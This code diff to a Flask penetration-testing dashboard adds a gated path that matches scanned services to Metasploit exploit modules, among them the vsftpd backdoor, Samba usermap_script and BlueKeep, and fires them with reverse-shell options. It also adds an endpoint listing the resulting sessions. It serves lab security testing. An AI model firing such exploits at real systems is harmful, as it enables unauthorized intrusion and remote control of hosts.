@@ -158,12 +158,7 @@ def create_app() -> Flask:
 
     @app.get("/sessions")
     def sessions():
-        return render_template(
-            "_simple_page.html", active="sessions",
-            page_title="Sessions", icon="terminal",
-            description=("Active Metasploit sessions and console output. "
-                         "Read-only - VulnPilot does not stage payloads."),
-        )
+        return render_template("sessions.html", active="sessions")
 
     @app.get("/ai")
     def ai_assistant():
@@ -384,6 +379,8 @@ def create_app() -> Flask:
                         for c in top
                     ],
                     "recommended_module": _recommended_module(svc),
+                    "recommended_exploit": _recommended_exploit(svc),
+                    "has_exploit": bool(_recommended_exploit(svc)),
                     "suggested_command": _suggest_command(svc, scan.target),
                 })
             services.sort(key=lambda x: x["port"])
@@ -425,6 +422,106 @@ def create_app() -> Flask:
             "enabled": True, "reachable": reachable,
             "host": host, "port": port, "message": message,
         })
+
+    @app.get("/api/exploit/status")
+    def exploit_status():
+        """Tell the UI whether the EXPLOIT button should be enabled.
+
+        All four conditions must hold for the UI to allow firing:
+          * config: metasploit.enabled = true
+          * env:    VULNPILOT_ALLOW_EXPLOIT = 1
+          * msfrpcd is reachable on the configured host:port
+          * an LHOST is resolvable (auto-detect or configured)
+        """
+        msf_cfg = get_settings().section("metasploit")
+        cfg_enabled = bool(msf_cfg.get("enabled"))
+        env_enabled = os.environ.get("VULNPILOT_ALLOW_EXPLOIT") == "1"
+
+        # Check msfrpcd reachability with a cheap TCP probe.
+        reachable = False
+        if cfg_enabled:
+            import socket
+            try:
+                with socket.create_connection(
+                    (msf_cfg.get("host", "127.0.0.1"),
+                     int(msf_cfg.get("port", 55553))),
+                    timeout=1.5,
+                ):
+                    reachable = True
+            except OSError:
+                reachable = False
+
+        lhost_setting = msf_cfg.get("lhost") or "auto"
+        lhost = (
+            _detect_lhost("8.8.8.8") if lhost_setting == "auto" else lhost_setting
+        )
+
+        ready = cfg_enabled and env_enabled and reachable
+        if not cfg_enabled:
+            why = "metasploit.enabled is false in configs/config.yaml"
+        elif not env_enabled:
+            why = ("VULNPILOT_ALLOW_EXPLOIT=1 was not set when the dashboard "
+                   "was launched. Restart with that env var to enable.")
+        elif not reachable:
+            why = "msfrpcd is not reachable - start it and reload the page."
+        else:
+            why = "Exploit mode is armed. Each fire still requires UI confirmation."
+
+        return jsonify({
+            "ready": ready,
+            "config_enabled": cfg_enabled,
+            "env_enabled": env_enabled,
+            "msf_reachable": reachable,
+            "lhost": lhost,
+            "lport": int(msf_cfg.get("lport") or 4444),
+            "message": why,
+        })
+
+    @app.get("/api/sessions")
+    def list_msf_sessions():
+        """Return active Metasploit sessions (read-only).
+
+        If a successful exploit has yielded a Meterpreter / shell, it shows
+        up here. The UI lists them in the Sessions page; we don't allow
+        sending commands from the browser - drop into msfconsole for that.
+        """
+        msf_cfg = get_settings().section("metasploit")
+        if not msf_cfg.get("enabled"):
+            return jsonify({"enabled": False, "sessions": []})
+
+        try:
+            from exploit_engine.metasploit_client import MetasploitClient
+            client = MetasploitClient(
+                host=msf_cfg.get("host", "127.0.0.1"),
+                port=int(msf_cfg.get("port", 55553)),
+                username=msf_cfg.get("username", "msf"),
+                password=msf_cfg.get("password", "msf"),
+                ssl=bool(msf_cfg.get("ssl", False)),
+                enabled=True,
+            )
+            client.connect()
+            sess_dict = client._client.sessions.list  # pymetasploit3 attr
+            sessions = []
+            for sid, info in (sess_dict or {}).items():
+                sessions.append({
+                    "id": sid,
+                    "type": info.get("type"),
+                    "via_exploit": info.get("via_exploit"),
+                    "via_payload": info.get("via_payload"),
+                    "tunnel_local": info.get("tunnel_local"),
+                    "tunnel_peer": info.get("tunnel_peer"),
+                    "info": info.get("info"),
+                    "session_host": info.get("session_host"),
+                    "username": info.get("username"),
+                    "platform": info.get("platform"),
+                    "uuid": info.get("uuid"),
+                })
+            return jsonify({"enabled": True, "sessions": sessions})
+        except Exception as exc:
+            log.exception("Failed to list MSF sessions")
+            return jsonify({
+                "enabled": True, "sessions": [], "error": str(exc),
+            }), 200
 
     @app.post("/api/services/<int:service_id>/scope")
     def toggle_service_scope(service_id: int):
@@ -488,6 +585,9 @@ def create_app() -> Flask:
 
             if action == "check":
                 return _do_msf_check(s, svc, target)
+
+            if action == "exploit":
+                return _do_msf_exploit(s, svc, target)
 
             return jsonify({"error": f"unknown action: {action}"}), 400
 
@@ -637,6 +737,38 @@ def _recommended_module(svc) -> str:
         # elasticsearch, etc.
     }
     return table.get(name, "manual review")
+
+
+def _recommended_exploit(svc) -> str | None:
+    """Map an Nmap service name to a *curated lab-only* exploit module.
+
+    Returns None if no exploit is registered for the service. Even a
+    non-None return must still pass `is_exploit_lab_safe()` before firing.
+    """
+    if not svc or not svc.name:
+        return None
+    name = svc.name.lower()
+    product = (svc.product or "").lower()
+    version = (svc.version or "").lower()
+
+    # Service-name first, then narrow by product/version where useful.
+    if name == "ftp" and "vsftpd" in product and "2.3.4" in version:
+        return "exploit/unix/ftp/vsftpd_234_backdoor"
+    if name == "ircd" and "unrealircd" in product:
+        return "exploit/unix/irc/unreal_ircd_3281_backdoor"
+    if name == "distccd":
+        return "exploit/unix/misc/distcc_exec"
+    if name in ("smb", "microsoft-ds", "netbios-ssn") and "samba" in product:
+        return "exploit/multi/samba/usermap_script"
+    if name == "postgresql":
+        return "exploit/linux/postgres/postgres_payload"
+    if name in ("http", "https") and "php" in product:
+        return "exploit/multi/http/php_cgi_arg_injection"
+    if name in ("rmi-registry", "java-rmi") or svc.port == 1099:
+        return "exploit/multi/misc/java_rmi_server"
+    if name == "ms-wbt-server":
+        return "exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
+    return None
 
 
 def _severity_label(cvss: float | None) -> str:
@@ -1022,6 +1154,193 @@ def _do_msf_check(s, svc, target: str):
         "action": "check",
         "status": result.status,
         "module": module_path,
+        "duration_seconds": round(result.duration_seconds, 1),
+        "run_id": run_id,
+        "output": (result.output or "(no output captured)")[-3000:],
+    })
+
+
+def _detect_lhost(target: str) -> str | None:
+    """Best-effort LHOST detection: pick the local IP that would route to
+    the target. Falls back to None - the caller must surface that to the
+    operator so they can set metasploit.lhost in config.yaml."""
+    import socket
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            # UDP connect doesn't actually send a packet but populates getsockname.
+            s.connect((target, 4444))
+            return s.getsockname()[0]
+        finally:
+            s.close()
+    except OSError:
+        return None
+
+
+def _do_msf_exploit(s, svc, target: str):
+    """Fire a *curated lab-only* exploit module against `svc`.
+
+    This is the EXPLOIT path (separate from _do_msf_check). It refuses to
+    run unless ALL of:
+      * config: metasploit.enabled = true
+      * env:    VULNPILOT_ALLOW_EXPLOIT = 1
+      * service has a registered exploit in _recommended_exploit()
+      * that module passes is_exploit_lab_safe() (curated allowlist)
+      * dashboard mode is 'exploit' on the parent scan, OR the request
+        explicitly carries 'confirmed': true (for ad-hoc per-card fires)
+
+    On success, persists an ExploitRun row with status='running' up-front,
+    then updates with the captured output. If the exploit yields a
+    Meterpreter / shell session, the session id appears in the output;
+    fetching /api/sessions surfaces all currently-active sessions.
+    """
+    from exploit_engine.module_selector import (
+        SelectedModule, is_exploit_lab_safe,
+    )
+    from exploit_engine.metasploit_client import (
+        MetasploitClient, MetasploitDisabled,
+    )
+
+    msf_cfg = get_settings().section("metasploit")
+
+    # Gate 1: config opt-in
+    if not msf_cfg.get("enabled"):
+        return jsonify({
+            "action": "exploit", "status": "skipped",
+            "output": ("Metasploit RPC is disabled. Set metasploit.enabled=true "
+                       "in configs/config.yaml and start msfrpcd."),
+        }), 200
+
+    # Gate 2: process-level opt-in (operator launched dashboard with intent)
+    if os.environ.get("VULNPILOT_ALLOW_EXPLOIT") != "1":
+        return jsonify({
+            "action": "exploit", "status": "blocked",
+            "output": (
+                "Exploit mode disabled. Stop the dashboard and relaunch with:\n"
+                "    VULNPILOT_ALLOW_EXPLOIT=1 VULNPILOT_AUTHORIZED=1 \\\n"
+                "        python main.py dashboard --port 5000\n\n"
+                "This must only be set in a controlled lab where you own the "
+                "target. The flag persists for the lifetime of the dashboard "
+                "process."
+            ),
+        }), 403
+
+    # Gate 3: service-specific recommended exploit must exist
+    module_path = _recommended_exploit(svc)
+    if not module_path:
+        return jsonify({
+            "action": "exploit", "status": "skipped",
+            "output": (
+                f"No curated exploit is registered for service '{svc.name}' "
+                f"({svc.product or '?'} {svc.version or '?'}).\n\n"
+                "VulnPilot only auto-fires exploits from a small, audited "
+                "allowlist (Metasploitable classics + a few Windows lab "
+                "boxes). For anything else, research manually with "
+                "msfconsole and point the matching module at "
+                f"RHOSTS={target} RPORT={svc.port}."
+            ),
+        }), 200
+
+    # Gate 4: hard allowlist (defence in depth in case _recommended_exploit
+    # is ever extended with something dangerous).
+    if not is_exploit_lab_safe(module_path):
+        log.error("Exploit module %s failed the lab-safe gate", module_path)
+        return jsonify({
+            "action": "exploit", "status": "blocked",
+            "output": f"Module {module_path} is not in the lab-exploit allowlist.",
+        }), 403
+
+    # Build options: RHOSTS/RPORT always, plus LHOST/LPORT for reverse payloads
+    opts = {"RHOSTS": target, "RPORT": svc.port}
+    lhost = msf_cfg.get("lhost") or "auto"
+    if lhost == "auto":
+        lhost = _detect_lhost(target)
+    if lhost:
+        opts["LHOST"] = lhost
+        opts["LPORT"] = int(msf_cfg.get("lport") or 4444)
+    else:
+        log.warning(
+            "Could not auto-detect LHOST for target %s; the exploit may "
+            "fail to deliver a reverse shell. Set metasploit.lhost in "
+            "configs/config.yaml.", target,
+        )
+
+    selection = SelectedModule(
+        module=module_path,
+        action="run",
+        options=opts,
+        target_host=target,
+        target_port=svc.port,
+        rationale="Operator-confirmed exploit fire via dashboard",
+        severity_hint="critical",
+    )
+
+    client = MetasploitClient(
+        host=msf_cfg.get("host", "127.0.0.1"),
+        port=int(msf_cfg.get("port", 55553)),
+        username=msf_cfg.get("username", "msf"),
+        password=msf_cfg.get("password", "msf"),
+        ssl=bool(msf_cfg.get("ssl", False)),
+        enabled=True,
+    )
+
+    run = ExploitRun(
+        scan_id=svc.scan_id,
+        module=module_path,
+        action="run",
+        options=str(opts),
+        status="running",
+        safe_mode=False,
+        result="(in progress)",
+    )
+    s.add(run)
+    s.flush()
+    run_id = run.id
+
+    log.warning(  # warning level - this is a real exploit, audit it loudly
+        "EXPLOIT %s -> %s:%s (run #%s) by operator request",
+        module_path, target, svc.port, run_id,
+    )
+
+    try:
+        # Exploits often need longer than aux scanners (handler setup, payload
+        # delivery, session establishment). Give them up to 3 minutes.
+        result = client.run(selection, timeout=180.0)
+    except MetasploitDisabled as exc:
+        run.status = "skipped"
+        run.result = f"MSF disabled: {exc}"
+        return jsonify({
+            "action": "exploit", "status": "skipped",
+            "output": str(exc),
+        }), 200
+    except Exception as exc:
+        log.exception("EXPLOIT %s failed", module_path)
+        run.status = "error"
+        run.result = f"{type(exc).__name__}: {exc}"
+        return jsonify({
+            "action": "exploit", "status": "error", "module": module_path,
+            "output": (
+                f"Exploit failed: {exc}\n\n"
+                "Common causes:\n"
+                f"  * Target {target}:{svc.port} is not actually vulnerable\n"
+                "  * LHOST is wrong (set metasploit.lhost in config.yaml)\n"
+                "  * msfrpcd lost connection (check ss -ltnp | grep 55553)"
+            ),
+        }), 500
+
+    run.status = result.status
+    run.result = (result.output or "")[-4000:]
+
+    log.warning(
+        "EXPLOIT %s finished status=%s in %.1fs (run #%s)",
+        module_path, result.status, result.duration_seconds, run_id,
+    )
+
+    return jsonify({
+        "action": "exploit",
+        "status": result.status,
+        "module": module_path,
+        "options": opts,
         "duration_seconds": round(result.duration_seconds, 1),
         "run_id": run_id,
         "output": (result.output or "(no output captured)")[-3000:],
